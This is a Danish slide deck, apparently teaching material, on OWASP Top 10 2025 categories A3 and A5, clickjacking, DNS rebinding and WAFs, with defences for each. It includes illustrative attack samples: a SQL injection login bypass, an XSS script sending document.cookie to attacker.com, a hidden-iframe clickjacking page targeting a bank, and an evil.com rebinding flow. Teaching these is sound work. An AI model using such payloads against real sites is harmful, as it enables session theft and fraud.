---
marp: true
theme: default
paginate: true
---

# OWASP Web Top 10: A3 og A5

Redegør for hvad OWASP er og redegør for og vis eksempler på sårbarheder i
følgende kategorier i OWASP Web Top 10 2025, samt forklar hvordan man kan sikre
sig mod disse:
A3 Software Supply Chain Failures
A5 Injection (inkl. Cross-Site Scripting og SQL Injection)
Samt redegør for følgende sårbarheder: Clickjacking og DNS Rebind.
Og forklar hvad Web Application Firewalls er og hvad de kan bruges til.

---

### Hvad er OWASP?

- **Open Web Application Security Project**
- Non-profit organisation grundlagt 2001
- Fokus på at forbedre software sikkerhed
- Tilbyder gratis ressourcer, værktøjer og dokumentation
- OWASP Top 10 = industri standard for web sikkerhedsrisici
- Opdateres hvert 3-4 år baseret på data og eksperter

---

### OWASP Top 10 2025 - Overblik

**Nye ændringer i 2025:**

1. A01 - Broken Access Control
2. A02 - Security Misconfiguration
3. **A03 - Software Supply Chain Failures** ⭐ NY
4. A04 - Cryptographic Failures
5. **A05 - Injection**
6. A06 - Insecure Design
7. A07 - Authentication Failures
8. A08 - Software & Data Integrity Failures
9. A09 - Security Logging and Alerting Failures
10. A10 - Mishandling of Exceptional Conditions ⭐ NY

---

### A03: Software Supply Chain Failures

## Hvad er det?

**Definition:** Sårbarheder eller kompromittering i software-udviklingskæden

**Omfatter:**

- Brug af komponenter med kendte sårbarheder
- Kompromitterede build-systemer og CI/CD pipelines
- Malicious packages og dependencies
- Opdateringsmekanismer uden validering
- Uautentificerede tredjepartskomponenter

---

### A03: Angrebsvektorer

**1. Malicious Packages**

- Typosquatting (f.eks. "reqeusts" i stedet for "requests")
- Account takeover af maintainers

**2. Kompromitterede Build Systems**

- SolarWinds (2020): Backdoor i signed updates
- GlassWorm (2025): VS Code Marketplace angreb

**3. Dependency Confusion**

- Public package overtager internal dependency navn

**4. Vulnerable Components**

- Log4Shell (CVE-2021-44228): Kritisk RCE

---

### A03: Eksempel - NPM Økosystemet

**Scenario: Node.js projekt med dependencies**

```bash
$ npm install
...
added 847 packages from 531 contributors

$ npm audit
found 23 vulnerabilities (5 moderate, 18 high)
```

**Problemet:**

- Moderne apps har hundredvis af dependencies
- Transitive dependencies (dependencies af dependencies)
- Én sårbar pakke påvirker hele projektet
- Automatiske opdateringer kan introducere malicious code

**Real eksempler:**

- `event-stream` (2018): Maintainer gav adgang til hacker
- `ua-parser-js` (2021): 8 millioner downloads/uge, hijacked

---

### A03: Sikringsmetoder

**1. Software Bill of Materials (SBOM)**

- Vedligehold komplet oversigt over komponenter
- Track dependencies og transitive dependencies

**2. Verificer og Valider**

- Brug kun trusted sources og signerede packages
- Implementer signature verification
- Check checksums

**3. Kontinuerlig Monitorering**

- Scan for CVEs i dependencies
- Automatiser opdateringer hvor muligt
- Brug SCA (Software Composition Analysis) værktøjer

---

### A03: Sikringsmetoder (fortsat)

**4. Hardned CI/CD Pipeline**

- Implementer access control og MFA
- Audit logs for alle ændringer
- Isoler build environments
- Principle of least privilege

**5. Developer Security**

- Beskyt developer workstations
- Kontroller IDE extensions
- Security awareness træning
- Code review processer

---

### A05: Injection

## Hvad er det?

**Definition:** Injektion af malicious data/kommandoer i et program

**Typer:**

- **SQL Injection**
- XML Injection
- **Cross-Site Scripting** (XSS)
- ...

**Status:** Faldt fra #3 (2021) til #5 (2025), men stadig kritisk

---

### SQL Injection - Hvordan virker det?

**Usikker kode:**

```
String query = "SELECT * FROM users WHERE
               username='" + userInput + "'";
```

**Angreb:**
Input: `admin' OR '1'='1`

**Resulterende query:**

```sql
SELECT * FROM users WHERE username='admin' OR '1'='1'
```

**Resultat:** Returnerer alle brugere, bypasser login

---

### Cross-Site Scripting (XSS)

**Definition:** Injektion af malicious scripts i web pages

**Typer:**

**1. Stored XSS:** Script gemmes på serveren

```html
<script>
  fetch("https://attacker.com/steal?cookie=" + document.cookie);
</script>
```

**2. Reflected XSS:** Script i URL parameter

```
site.com/search?q=<script>alert('XSS')</script>
```

**3. DOM-based XSS:** Client-side manipulation

---

### XSS - Konsekvenser

**Hvad kan en angriber gøre?**

- Stjæle session cookies → Account takeover
- Keylogging
- Phishing attacks
- Defacement af website
- Udfør handlinger som ofret
- Installere malware

---

### A05: Sikringsmetoder

**1. Prepared Statements / Parameterized Queries**

```java
PreparedStatement stmt = conn.prepareStatement(
  "SELECT * FROM users WHERE username = ?");
stmt.setString(1, userInput);
```

**2. Input Validation**

- Whitelist tilgang (accepter kun gyldige tegn)
- Reject suspicious input
- Validate datatype, length, format

---

### A05: Sikringsmetoder (fortsat)

**3. Output Encoding**

- HTML encoding: `<` → `&lt;`
- JavaScript encoding
- URL encoding
- CSS encoding
- Context-aware escaping

**4. Brug Sikre Frameworks**

- Modern frameworks med built-in beskyttelse
- React, Angular: Automatisk XSS protection
- ORM frameworks for database queries

---

### A05: Sikringsmetoder (fortsat)

**5. Content Security Policy (CSP)**

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' trusted.cdn.com
```

**6. Principle of Least Privilege**

- Database bruger med minimale rettigheder
- Separate læse/skrive accounts
- Ingen admin rettigheder til app

**7. Testing**

- Static Analysis (SAST)
- Dynamic Analysis (DAST)
- Penetration testing

---

### Clickjacking

## Hvad er det?

**Definition:** UI redress attack - narrer brugere til at klikke på skjulte elementer

**Hvordan:**

1. Angriber laver en falsk/lokkende side
2. Loader target site i transparent iframe
3. Positionerer iframe over lokkende knapper
4. Bruger tror de klikker på én ting, men aktiverer andet

**Også kaldt:** UI redressing

---

### Clickjacking - Eksempel Scenario

**Angribers side:**

```html
<iframe src="https://bank.com/transfer" style="opacity:0; position:absolute">
</iframe>
<button>GRATIS iPad! KLIK HER!</button>
```

**Hvad sker der:**

- Bruger ser "GRATIS iPad" knappen
- Klikker på den
- Klikket rammer den skjulte iframe
- Aktiverer "Overfør penge" på bank.com
- Angriber modtager pengene

---

### Clickjacking - Beskyttelse

**1. X-Frame-Options Header**

```
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN
```

**2. Content Security Policy**

```
Content-Security-Policy:
  frame-ancestors 'none';
  frame-ancestors 'self';
```

**3. SameSite Cookies**

```
Set-Cookie: session=abc123; SameSite=Strict
```

**4. Frame Busting Scripts** (mindre pålidelig)

---

### DNS Rebinding

## Hvad er det?

**Definition:** Angreb der omgår Same-Origin Policy ved at manipulere DNS

**Hvordan det virker:**

1. Bruger besøger evil.com
2. evil.com's DNS returnerer angribers IP
3. Browser loader siden med JavaScript
4. JavaScript laver nye requests til evil.com
5. DNS returnerer nu INTERN IP (f.eks. 192.168.1.1)
6. Browser tillader det (samme domain!)
7. Angriber kan nu tilgå internal netværk

---

### DNS Rebinding - Attack Flow

```
Trin 1: DNS Query for evil.com → 1.2.3.4 (angribers server)
Trin 2: Browser loader JavaScript fra 1.2.3.4
Trin 3: JS laver ny request til evil.com
Trin 4: DNS Query for evil.com → 192.168.1.1 (router)
Trin 5: Browser tillader (samme origin: evil.com)
Trin 6: Angriber kontrollerer router, IoT devices etc.
```

**Nøgle:** Meget kort TTL (0-1 sekund) på DNS record

---

### DNS Rebinding - Beskyttelse

**1. DNS Validation**

- DNS servers skal filtrere private IP ranges
- Block resolution af eksterne domæner til interne IPs

**2. Host Header Validation**

- Verificer Host header i alle requests
- Reject requests med unexpected hosts

3. Browser DNS Caching

- Browsere omgår den korte TTL

---

### Web Application Firewall (WAF)

**Definition:** Firewall på applikationslaget (Layer 7) der filtrerer HTTP/HTTPS traffic

**Funktion:**

- Analyserer HTTP requests og responses
- Blokerer malicious requests før de når serveren
- Regel-baseret eller ML-baseret detection
- Position: Reverse proxy mellem klienter og server

**Security Models:**

- **Positive (Whitelist):** Tillad kun kendt godt traffic
- **Negative (Blacklist):** Blokér kendt dårligt traffic
- **Hybrid:** Kombination - mest almindelig

---

### WAF - Beskyttelse og Deployment

**Beskytter mod:**

- SQL Injection (pattern matching for SQL syntax)
- XSS (script tag detection, HTML encoding enforcement)
- Rate limiting og session validation
- OWASP CRS: Open-source regel set der dækker Top 10

**Deployment:**

- **Cloud WAF:** Hurtig deployment, auto-scaling (Cloudflare, AWS WAF)
- **On-premise:** Fuld kontrol, compliance (F5, ModSecurity)

**Begrænsning:** Ikke silver bullet - kan bypasses, kræver tuning, skal kombineres med secure coding (Defense in Depth)

---
